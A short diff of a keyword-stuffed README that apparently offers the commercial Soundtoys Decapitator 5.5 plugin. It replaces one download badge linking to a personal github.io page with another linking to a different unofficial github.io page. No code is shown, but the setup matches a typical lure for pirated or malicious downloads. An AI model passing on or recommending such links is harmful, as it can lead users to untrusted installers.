@@ -21,7 +21,7 @@ To begin using this **Soundtoys Decapitator 5.5 saturation plugin** and **Soundt
 | :--- | :--- |
 | **Get Soundtoys Decapitator 5.5** | Click the button below to initiate the setup for this **Soundtoys Decapitator 5.5 distortion tool for DAW**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Soundtoys_Decapitator_5.5-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/soundtoys-decapitator-5-5)
+[![Decapitator](https://img.shields.io/badge/Try-Decapitator%20-9333EA?style=for-the-badge)](https://soundtoys-decapitator-vst.github.io/.github/soundtoys-decapitator)
 
 ## System Requirements
 
